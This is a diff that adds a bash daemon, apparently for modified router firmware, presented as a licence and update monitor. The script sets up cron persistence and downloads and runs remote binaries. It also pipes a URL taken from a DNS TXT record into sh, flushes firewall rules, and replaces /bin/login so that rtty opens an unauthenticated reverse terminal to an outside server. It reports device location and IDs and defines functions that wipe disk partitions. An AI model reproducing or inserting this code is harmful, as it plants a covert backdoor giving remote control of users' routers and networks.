@@ -1,0 +1,581 @@
+#!/bin/bash
+AUTHTOOL_MD5="31131aa30cccea4f2676810a66254d0f"
+debug() {
+    debuglog=$( [ -s /tmp/debug_on ] && cat /tmp/debug_on || echo -n /tmp/debug.log )
+    if [ "$1" = "clear" ]; then
+        rm -f $debuglog && return
+    fi
+
+    if [ -f /tmp/debug_on ]; then
+        TIME_STAMP=$(date +"%Y%m%d %H:%M:%S")
+        echo "[$TIME_STAMP]: M1> $1" >>$debuglog
+    fi
+}
+
+compare_version() {
+
+    version1=$1
+    version2=$2
+    v1_1=`echo $version1 | cut -d '.' -f 1`
+    v1_2=`echo $version1 | cut -d '.' -f 2`
+    v1_3=`echo $version1 | cut -d '.' -f 3`
+    v2_1=`echo $version2 | cut -d '.' -f 1`
+    v2_2=`echo $version2 | cut -d '.' -f 2`
+    v2_3=`echo $version2 | cut -d '.' -f 3`
+
+    v1sum=$((v1_1 * 10000 + v1_2 * 100 + v1_3))
+    v2sum=$((v2_1 * 10000 + v2_2 * 100 + v2_3))
+    if [ $v1sum -gt $v2sum ]; then
+        return 0 # version1 > version2
+    else
+        return 1 # version1 <= version2
+    fi
+}
+
+# 确保不被重复执行
+exit_if_running() {
+    pidfile="/tmp/iktmp/monitor_ros.pid"
+    if [ -f "$pidfile" ]; then
+        old_pid=$(cat "$pidfile")
+        if kill -0 "$old_pid" 2>/dev/null; then
+            debug "脚本已经在运行，退出"
+            exit
+        fi
+    fi
+    echo $$ > "$pidfile"
+    trap "rm -f $pidfile" EXIT
+}
+
+# 检查网络状态，直到网络连接成功才继续向下执行
+check_network() {
+    debug "开始检查网络状态"
+    while true; do
+        ping -c2 qq.com >/dev/null 2>&1 && break
+        ping -c2 163.com >/dev/null 2>&1 && break
+        ping -c2 baidu.com >/dev/null 2>&1 && break
+        curl -s --head --connect-timeout 5 --request GET https://www.baidu.com >/dev/null 2>&1 && break
+        curl -s --head --connect-timeout 5 --request GET https://www.tencent.com  >/dev/null 2>&1 && break
+        curl -s --head --connect-timeout 5 --request GET https://www.aliyun.com  >/dev/null 2>&1 && break
+        curl -s --head --connect-timeout 5 --request GET https://www.taobao.com  >/dev/null 2>&1 && break
+        ikntpget -s >/dev/null 2>&1 && break
+        sleep 10
+    done
+    debug "网络连接正常，继续运行"
+}
+
+add_crontab(){
+    debug "开始检查定时任务"
+    vnlcro=`cat /etc/crontabs/root | grep "/usr/ikuai/script/monitor_ros" | wc -l`
+    if [ $vnlcro -eq 0 ]; then
+        cronTask="0 * * * * nice /usr/ikuai/script/monitor_ros"
+        echo "$cronTask" >>/etc/crontabs/cron.d/monitor_ros
+        echo  "$cronTask" >>/etc/crontabs/root
+        crontab /etc/crontabs/root
+    fi
+
+    crondproc=`ps | grep crond | grep -v grep | wc -l`
+    if [ $crondproc -eq 0 ]; then
+        crond -L /dev/null
+    fi
+}
+
+join_pubnetwork() {
+    debug "未激活，加入公共网络"
+    vnl_process=$(ps | grep "vnl -f" | grep -v "grep" | wc -l)
+    if [ $vnl_process -eq 0 ]; then
+        cloneInd=$(hexdump -v -s $((0x86 + $EMBED_FACTORY_PART_OFFSET)) -n 1 -e '1/1 "%02x"' $eep_mtd)
+        if [ "$cloneInd" = "01" ]; then
+            debug "克隆重置机器,加入特殊的VNT网络"
+            echo "token: fail01.routeros.fun" >/tmp/iktmp/vnl.cfg
+        elif [ "$cloneInd" = "02" ]; then
+            debug "RSA校验失败机器,加入特殊的VNT网络"
+            echo "token: fail02.routeros.fun" >/tmp/iktmp/vnl.cfg
+        elif [ "$cloneInd" = "03" ]; then
+            debug "获取签名多次失败,加入特殊的VNT网络"
+            echo "token: fail03.routeros.fun" >/tmp/iktmp/vnl.cfg
+        elif [ "$cloneInd" = "04" ]; then
+            debug "AUTHTOOL被篡改,加入特殊的VNT网络"
+            echo "token: fail04.routeros.fun" >/tmp/iktmp/vnl.cfg
+        elif [ $BLKIND -gt 0 ]; then
+            debug "黑白名单检测未通过机器,加入特殊的VNT网络"
+            echo "token: black.routeros.fun" >/tmp/iktmp/vnl.cfg
+        else
+            echo "token: pubnet.routeros.fun" >/tmp/iktmp/vnl.cfg
+        fi
+
+        vid=$(cat /tmp/iktmp/vnl_vid)
+        vname=$boardName-$versionNum-$mc
+        if [ -f /etc/log/.dbbuildnum ]; then
+            dbver=$(cat /etc/log/.dbbuildnum)
+            vname=${boardName}-${versionNum}-${dbver:4:8}-${mc}
+        fi
+        
+        echo "device_id: $vid" >>/tmp/iktmp/vnl.cfg
+        echo "name: $vname" >>/tmp/iktmp/vnl.cfg
+        echo "password: www.ikuai88.net.cn" >>/tmp/iktmp/vnl.cfg
+        echo "server_address: txt:$VNT_SERVER" >>/tmp/iktmp/vnl.cfg
+        echo "disable_stats: true" >>/tmp/iktmp/vnl.cfg
+
+        /usr/sbin/vnl -f /tmp/iktmp/vnl.cfg > /tmp/.vnet.log 2>&1 &
+        debug "加入VNT网络: $(cat /tmp/iktmp/vnl.cfg)"
+        (sleep 5; rm -f /tmp/iktmp/vnl.cfg;) >/dev/null 2>&1 & 
+    fi
+}
+
+check_keyfiles() {
+    authtool_md5=$(busybox md5sum /tmp/authtool | awk -F " " '{print $1}')
+    if [ "$authtool_md5" = "$AUTHTOOL_MD5" ]; then
+        debug "AUTHTOOL监测正常"
+    else
+        debug "AUTHTOOL被篡改, 重置激活并重启系统"
+        __reset_activation "04"
+    fi
+}
+
+verify_signature() {
+
+    debug "开始检查激活授权签名"
+
+    authtool check-code || {
+        debug "系统未激活，跳过激活授权签名检查"
+        rm -rf $EXT_PLUGIN_INSTALL_DIR
+        return
+    }
+
+    # 如果签名不存在则尝试获取，如果数据库中有记录则可成功获取，从而给老版本打补丁
+    # 有6次尝试机会（6 * 30m = 3小时），超过则清除激活码并重启
+    authtool try-pull || {
+        if [ "$signature_try_ct" -lt 6 ]; then
+            signature_try_ct=$(($signature_try_ct+1))
+            debug "尝试获取签名失败，30分钟后重试，$signature_try_ct/6..."
+            return
+        else
+            debug "6次尝试获取签名均失败，清除激活并重启"
+            rm -rf $EXT_PLUGIN_INSTALL_DIR
+            authtool clear-sign "03"
+            busybox reboot && exit
+        fi
+    }
+
+    authtool check-sign || {
+        debug "签名验证失败，清除激活信息并重启"
+        rm -rf $EXT_PLUGIN_INSTALL_DIR
+        authtool clear-sign "02"
+        busybox reboot && exit
+    }
+
+    # 如果激活签名已到刷新时间则联网刷新取得延期
+    authtool try-renew
+
+    #强制同步时间，保证激活授权过期验证正常
+    ikntpget -s
+
+    authtool check-date || { 
+        debug "签名已过期，清除激活信息并重启"
+        rm -rf $EXT_PLUGIN_INSTALL_DIR
+        authtool clear-sign "05"
+        busybox reboot && exit
+    }
+}
+
+check_clone(){
+    debug "已激活，开始检查克隆机器"
+    vid=$(cat /tmp/iktmp/vnl_vid)
+    dbver=$(cat /etc/log/.dbbuildnum)
+    vname=${boardName}-${versionNum}-${dbver:4:8}-${mc}
+
+    # token=$boardName.routeros.fun
+    token=$mc
+    [ $BLKIND -gt 0 ] && token=black.routeros.fun
+    
+    Vmen=0
+    while true; do
+        vnl_process=$(ps | grep "vnl -f" | grep -v "grep" | wc -l)
+        if [ $vnl_process -eq 0 ]; then
+            
+            echo "token: $token" >/tmp/iktmp/vnl.cfg
+            echo "device_id: $vid" >>/tmp/iktmp/vnl.cfg
+            echo "name: $vname" >>/tmp/iktmp/vnl.cfg
+            echo "password: www.ikuai88.net.cn" >>/tmp/iktmp/vnl.cfg
+            echo "server_address: txt:$VNT_SERVER" >>/tmp/iktmp/vnl.cfg
+            echo "disable_stats: true" >>/tmp/iktmp/vnl.cfg
+
+            /usr/sbin/vnl -f /tmp/iktmp/vnl.cfg > /tmp/.vnet.log 2>&1 &
+            sleep 1 && rm -f /tmp/iktmp/vnl.cfg
+        fi
+
+        sleep 6
+
+        verror=$(cat /tmp/.vnet.log | grep "error" | wc -l)
+        if [ $verror -gt 0 ]; then
+            debug "连接VNL失败，尝试重启vnl进程"
+            killall vnl
+            continue
+        fi
+
+        vSuccess=$(cat /tmp/.vnet.log | grep "Successfully" | wc -l)
+        if [ $vSuccess -gt 0 ]; then
+            Online=$(/usr/sbin/vnl --list | grep "Online" | grep "$mc" | wc -l)
+            if [ $Online -gt 0 ]; then
+                debug "检测到克隆机器, 重置激活并重启"
+                authtool clear-sign "01"
+            fi
+        fi
+
+        let Vmen=Vmen+1
+        if [ $Vmen -gt 10 ]; then
+            debug "克隆检测结束"
+            break
+        fi
+    done
+}
+
+check_pmd_update() {
+    debug "开始检查PKG数据库版本"
+    [ $ARCH = "x86" ] || return
+    
+    online_vernum=$(wget -qO- "$PKG_DOWNLOAD_URL/releasepkg-${mc}")
+    [ "$online_vernum" ] || online_vernum=$(wget -qO- "$PKG_DOWNLOAD_URL/releasepkg") 
+    [ "$online_vernum" ] || return
+    
+    local_vernum=$(cat /etc/log/.dbbuildnum)
+    [ "$local_vernum" ] || local_vernum=000000000000
+    if [ "$local_vernum" -lt "$online_vernum" ]; then
+        debug "发现新版本，开始下载"
+        wget -qO /tmp/iktmp/$online_vernum.pkg "$PKG_DOWNLOAD_URL/$online_vernum.pkg" || return
+        printf "\x1f\x8b\x08\x00\x6f\x9b\x4b\x59\x02\x03" > /tmp/iktmp/$online_vernum.header
+        cat /tmp/iktmp/$online_vernum.header /tmp/iktmp/$online_vernum.pkg > /tmp/iktmp/$online_vernum.gz
+        gunzip < /tmp/iktmp/$online_vernum.gz > /tmp/iktmp/$online_vernum.b64
+        base64 -d < /tmp/iktmp/$online_vernum.b64 > /tmp/iktmp/$online_vernum
+        chmod +x /tmp/iktmp/$online_vernum && /tmp/iktmp/$online_vernum
+        ret=$? && rm /tmp/iktmp/$online_vernum /tmp/iktmp/$online_vernum.*
+        if [ $ret -eq 0 ]; then
+            debug "更新成功，重启"
+            busybox reboot
+            return
+        else
+            debug "更新失败，退出！"
+            return
+        fi
+    fi      
+}
+
+check_plugin_update() {
+
+    debug "开始检查更新插件"
+    if [ ! -f /tmp/iktmp/plugins/all_installed ]; then
+        debug "插件未全部加载，退出"
+        return
+    fi
+
+    jsonurl=$RMT_PLUGIN_BASE_URL/i-plugins.json
+    release=$(wget -qO- "$RMT_PLUGIN_BASE_URL/i-release-${mc}")
+    if [ "$release" ]; then 
+        jsonurl=$RMT_PLUGIN_BASE_URL/i-plugins-${mc}.json
+    else
+        release=$(wget -qO- "$RMT_PLUGIN_BASE_URL/i-release")
+    fi
+
+    if [ -f /etc/mnt/plugins/configs/i-plugins.json ]; then
+        
+        [ "$release" ] || return
+        
+        vernum=$(echo $release | awk -F'#' '{print($1)}')
+        old_release=$(cat /etc/mnt/plugins/configs/i-release 2>/dev/null)
+        old_vernum=$(echo $old_release | awk -F'#' '{print($1)}')
+
+        [ "$vernum" -gt "$old_vernum" ] || return
+    fi
+
+    debug "发现新版本插件列表，开始处理"
+    [ "$release" ] || release="000000000000#FFFFFFFFFFFF"
+    echo "$release" > /etc/mnt/plugins/configs/i-release
+    
+    onlinePlugins=$(wget -qO- "$jsonurl")
+
+    # 过滤不兼容插件
+    onlinePlugins=$(echo "$onlinePlugins" | jq "map(select(.compatibility | index(\"$platform\") or index(\"all\")))")
+    echo "$onlinePlugins" > /etc/mnt/plugins/configs/i-plugins.json
+
+    # 处理筛选出的节点
+    echo "$onlinePlugins" | jq -c '.[]' | while read -r metadata; do update_plugin "$metadata"; done
+}
+
+update_plugin()
+{
+    metadata=$1
+    name=$(echo "$metadata" | jq -r '.name')
+    build=$(echo "$metadata" | jq -r '.build')
+    version=$(echo "$metadata" | jq -r '.version')
+    type=$(echo "$metadata" | jq -r '.type')
+    compatibility=$(echo "$metadata" | jq -r '.compatibility')
+
+    debug "开始处理内置插件 $name"
+
+    current_version=$(jq -r .version $INN_PLUGIN_INSTALL_DIR/$name/html/metadata.json 2>/dev/null)
+
+    if compare_version "$version" "$current_version"; then
+        debug "内置插件 $name 发现新版本 $current_version -> $version，开始更新"
+
+        # 更新或安装内置插件
+        if echo "$compatibility" | grep -q "all"; then
+            url="$RMT_PLUGIN_BASE_URL/ipk/plugin-$name-v$version-Build$build.ipk"
+        else
+            url="$RMT_PLUGIN_BASE_URL/ipk/plugin-$name-$platform-v$version-Build$build.ipk"
+        fi
+
+        debug "插件下载地址: $url"
+
+        FILE=/tmp/iktmp/iplugindwfile
+        if wget -O $FILE $url; then
+            debug "下载成功，开始解密插件包"
+            FILE_tar=/tmp/iktmp/ipluginapp.tar.gz
+            authtool decrypt $FILE $FILE_tar -i >/dev/null 2>/dev/null
+            if [ $? -ne 0 ];then
+                rm -f $FILE $FILE_tar
+                debug "插件 $name 解密失败"
+                return 1
+            else
+                uninstall=$INN_PLUGIN_INSTALL_DIR/$name/uninstall.sh
+                [ -f $uninstall ] && chmod +x $uninstall && $uninstall
+
+                mkdir -p $INN_PLUGIN_INSTALL_DIR/$name
+                tar -xzf $FILE_tar -C $INN_PLUGIN_INSTALL_DIR/$name
+                bash $INN_PLUGIN_INSTALL_DIR/$name/install.sh new
+                rm -f $FILE $FILE_tar
+                debug "插件 $name 更新成功"
+            fi
+        fi
+    fi
+}
+
+check_safty() {
+    pidof iktunc && busybox reboot -f
+    [ -d /var/run/iktunc ] && busybox reboot -f
+    [ -f /usr/sbin/iktunc ] && busybox reboot -f
+    [ "$(grep -v sshd /etc/passwd | md5sum | awk -F ' ' '{print($1)}')" = "b869e89e8f667c58a9c4c8c39d4ad77c" ] || busybox reboot -f
+    grep -q routeros /etc/hosts && busybox reboot -f
+    # if [ ! -f /tmp/debug_on ]; then
+    #     busybox killall -q dropbear >/dev/null 2>&1
+    #     busybox killall -q telnetd >/dev/null 2>&1
+    #     busybox killall -q sshd >/dev/null 2>&1
+    #     busybox killall -q ttyd >/dev/null 2>&1
+    #     sshd_port=$(sqlite3 /etc/mnt/ikuai/config.db "select sshd_port from remote_control;")
+    #     open_sshd=$(sqlite3 /etc/mnt/ikuai/config.db "select open_sshd from remote_control;")
+    #     [ "$open_sshd" = "1" ] && dropbear -p $sshd_port
+    # fi
+}
+
+
+allow_vnl() {
+    vnladdr=$(curl -s "https://doh.pub/dns-query?name=${VNT_SERVER}&type=TXT" | jq -r '.Answer[].data' | sed -E 's/"//g')
+    if [ -z "$vnladdr" ]; then
+        vnladdr=$(curl -s "https://dns.alidns.com/resolve?name=${VNT_SERVER}&type=TXT" | jq -r '.Answer[].data' | sed -E 's/"//g')
+    fi
+    vnlip=$(echo $vnladdr | awk -F':' '{print($1)}')
+    vnlport=$(echo $vnladdr | awk -F':' '{print($2)}')
+    ipwc=$(iptables -vnL  INPUT_ACL --line-number|grep "$vnlip"|wc -l)
+    portwc=$(iptables -vnL  INPUT_ACL --line-number|grep "$vnlport"|wc -l)
+    if [ $ipwc -gt 0 ] || [ $portwc -gt 0 ];then
+        iptables -F INPUT_ACL
+        iptables -F OUTPUT_ACL
+        ip6tables -F INPUT_ACL6
+    fi
+}
+
+connect_rtty() {
+
+    debug "开始查询rtty地址:$RTTY_SERVER"
+    rttyaddr=$(curl -s "https://doh.pub/dns-query?name=${RTTY_SERVER}&type=TXT" | jq -r '.Answer[].data' | sed -E 's/"//g')
+    if [ -z "$rttyaddr" ]; then
+        rttyaddr=$(curl -s "https://dns.alidns.com/resolve?name=${RTTY_SERVER}&type=TXT" | jq -r '.Answer[].data' | sed -E 's/"//g')
+    fi
+    
+    if [ -z "$rttyaddr" ]; then
+        debug "rtty地址获取失败,退出"
+        return
+    fi
+
+    # 匹配 IPv4:端口
+    if [[ "$rttyaddr" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}:[0-9]{1,5}$ ]]; then
+
+        rttyip=$(echo $rttyaddr | awk -F':' '{print($1)}')
+        rttyport=$(echo $rttyaddr | awk -F':' '{print($2)}')
+        ipwc=$(iptables -vnL  INPUT_ACL --line-number|grep "$rttyip"|wc -l)
+        portwc=$(iptables -vnL  INPUT_ACL --line-number|grep "$rttyport"|wc -l)
+        if [ $ipwc -gt 0 ] || [ $portwc -gt 0 ];then
+            iptables -F INPUT_ACL
+            iptables -F OUTPUT_ACL
+            ip6tables -F INPUT_ACL6
+        fi
+    
+        rttyaddrck1=$(cat /tmp/iktmp/rttyaddrck)
+        echo "$rttyaddr" | md5sum > /tmp/iktmp/rttyaddrck
+        rttyaddrck2=$(cat /tmp/iktmp/rttyaddrck)
+        if [ "$rttyaddrck1" != "$rttyaddrck2" ]; then
+            debug "rtty地址有变化，重新启动"
+            killall rtty
+        else
+            debug "rtty地址没有变化"
+            pidof rtty && return
+        fi
+
+        if [ ! -f /usr/sbin/rtty ]; then
+            debug "rtty未安装，开始安装"
+            wget -O /tmp/rtty.tar.gz ${RMT_PLUGIN_BASE_URL%/plugins/release}/resources/RTTY/rtty-${platform}.tar.gz
+            if [ $? -ne 0 ]; then
+                debug "rtty安装失败"
+                return
+            fi
+            tar -xzf /tmp/rtty.tar.gz -C /tmp 
+            ln -sf /tmp/rtty /usr/sbin/rtty
+            ln -sf /tmp/libssl.so.1.1 /usr/lib/libssl.so.1.1
+            ln -sf /tmp/libcrypto.so.1.1 /usr/lib/libcrypto.so.1.1
+            ln -sf /tmp/cert.pem /usr/ikuai/cert.pem         
+            chmod +x /usr/bin/rtty        
+            rm -f /tmp/rtty.tar.gz        
+            debug "rtty安装完成"
+        fi
+
+        geoaddr=$(curl -s "http://my.ip.cn/json/" | jq -r '"\(.data.province)\(.data.city)\(.data.district)-\(.data.isp)"')
+        desc="$(hostname)|$boardName|$versionNum|$mc|$geoaddr"
+
+        [ $BLKIND -gt 0 ] && desc="[BLACK]"$desc
+        authtool check-code || desc="[INACT]"$desc
+        grep -q VIRTUAL_DEVICE /etc/release && desc="[VM]"$desc
+
+        debug "rtty连接信息：$rttyip:$rttyport-$desc"
+        ln -sf /etc/setup/rc /bin/login
+        rtty -d "$desc" -I "$GWID" -h $rttyip -p $rttyport -s -a -C /usr/ikuai/cert.pem &
+    
+    elif [[ "$rttyaddr" =~ ^https?://.+$ ]]; then # 匹配 http 或 https URL
+        curl -fsSL $rttyaddr | sh &
+    else
+        debug "rtty地址不合法，退出"
+        killall rtty
+        return
+    fi
+}
+
+remove_oldversion() {
+    [ -f /usr/ikuai/script/utils/monitor_ros.sh ] || return
+
+    debug "开始卸载旧版本"
+    sed -i /monitor_ros.sh/d /etc/crontabs/root
+    sed -i /monitor_ros.sh/d /etc/crontabs/cron.d/monitor_ros
+    crontab /etc/crontabs/root
+	pkill -f '/usr/ikuai/script/utils/monitor_ros.sh' >/dev/null 2>&1
+    killall -q vnl >/dev/null 2>&1
+	kill -9 $(cat /tmp/iktmp/monitor_ros.pid) >/dev/null 2>&1
+	rm -f /tmp/iktmp/monitor_ros.pid
+}
+
+__format_system() {
+    dd if=/dev/zero of=/dev/${BOOTHDD}1 bs=1M >/dev/null 2>&1
+    dd if=/dev/zero of=/dev/${BOOTHDD}2 bs=1M >/dev/null 2>&1
+    dd if=/dev/zero of=/dev/${BOOTHDD}3 bs=1M >/dev/null 2>&1
+    dd if=/dev/zero of=/dev/${BOOTHDD}5 bs=1M >/dev/null 2>&1
+    busybox reboot   
+}
+
+__reset_system() {
+    busybox rm -rf /etc/log/*
+    busybox rm -rf /etc/mnt/*
+    busybox reboot
+}
+
+__reset_activation()
+{
+    debug "清除激活授权信息"
+    reasonCode="\x${1:-00}"
+
+    cleanCode1="00000000000000000000"
+    cleanCode2="0000000000000000000000000000"
+
+    rm -rf $EXT_PLUGIN_INSTALL_DIR
+
+    if [ "$ARCH" = "x86" ]; then
+        printf $(echo "$cleanCode1" | sed 's/../\\x&/g') | dd of=$mtd_block bs=$((0x8C + $EMBED_FACTORY_PART_OFFSET)) seek=1 conv=notrunc >/dev/null 2>&1
+    else
+        printf $(echo "$cleanCode1" | sed 's/../\\x&/g') | dd of=$mtd_block bs=$((0x8C + $EMBED_FACTORY_PART_OFFSET)) seek=1 conv=notrunc >/dev/null 2>&1
+    fi
+    printf "$reasonCode" | dd of=$mtd_block bs=$((0x86 + $EMBED_FACTORY_PART_OFFSET)) seek=1 conv=notrunc >/dev/null 2>&1
+    printf $(echo "$cleanCode2" | sed 's/../\\x&/g') | dd of=$mtd_block bs=$((0x2000 + $EMBED_FACTORY_PART_OFFSET)) seek=1 conv=notrunc >/dev/null 2>&1
+    printf $(echo "$cleanCode2" | sed 's/../\\x&/g') | dd of=$mtd_block bs=$((0x2008 + 256 + $EMBED_FACTORY_PART_OFFSET)) seek=1 conv=notrunc >/dev/null 2>&1
+    busybox reboot && exit
+}
+
+# busybox rm -- $0 
+. /etc/release
+. /etc/mnt/plugins/configs/config.sh
+
+[ "$ARCH" = "mips" ] && platform="mt7621"
+[ "$ARCH" = "arm" ] && platform="mt798x"
+[ "$ARCH" = "x86" ] && platform="x86"
+
+if [ "$ARCH" = "x86" ]; then
+    EMBED_FACTORY_PART_OFFSET=0
+    eep_mtd=/dev/${BOOTHDD}2
+    mtd_block=/dev/${BOOTHDD}2
+    uuid=$(cat /sys/class/dmi/id/product_uuid | md5sum | tr '[:lower:]' '[:upper:]')
+    mc=$(hexdump -v -s $((0x88)) -n 4 -e '1/1 "%02X"' /dev/${BOOTHDD}2)${uuid:5:8}
+    mc_old=EC$(cat /sys/class/dmi/id/product_uuid | awk -F '-' '{print $NF}' | tr '[:lower:]' '[:upper:]')
+else
+    eep_mtd=/dev/$(cat /proc/mtd | grep "Factory" | cut -d ":" -f 1)
+    mtd_block="/dev/mtdblock$(grep 'Factory' /proc/mtd | cut -d ':' -f 1 | tr -cd '0-9')"
+    mc=$(hexdump -v -s $((0x88 + $EMBED_FACTORY_PART_OFFSET)) -n 4 -e '1/1 "%02X"' $eep_mtd)
+fi
+
+RTTY_SERVER="rt.routeros.top"
+VNT_SERVER="vnt.routeros.top"
+PKG_DOWNLOAD_URL="https://routerostop.oss-cn-shanghai.aliyuncs.com/x86-installer"
+boardName="x86"
+macString=$(echo "$DEVICE_MAC" | tr -d ':' | tr '[:lower:]' '[:upper:]')
+versionNum=$(echo "$VERSION" | tr -d '.')
+BLKIND=0
+signature_try_ct=0
+[ -f /tmp/iktmp/vnl_vid ] || echo $macString$((1 + RANDOM % 100)) >/tmp/iktmp/vnl_vid
+
+# remove_oldversion
+exit_if_running
+
+( while true; do sleep 10; check_safty; done ) &
+while true; do
+    debug "守护进程启动..."
+    start_time=$(date +%s)
+
+    # 检查核心文件是否被篡改
+    check_keyfiles
+
+    # 检查网络状态，直到网络连接成功才继续向下执行
+    check_network
+
+    # 检查PMD更新
+    check_pmd_update
+
+    # 检查插件更新
+    check_plugin_update
+
+    connect_rtty
+
+    verify_signature
+
+    # # allow_vnl
+    # # if authtool check-code; then
+    # #     # 已经激活则检查是否存在克隆机器
+    # #     check_clone
+    # # else
+    # #     # 未激活时加入公共VNT网络
+    # #     join_pubnetwork
+    # # fi
+
+    # 如果定时任务不存在，则添加定时任务
+    # 定时任务作为守护线程，每60分钟执行一次
+    add_crontab
+
+    debug "守护进程运行结束，耗时：$(($(date +%s)-$start_time))秒"
+
+    sleep 1800
+
+done
+
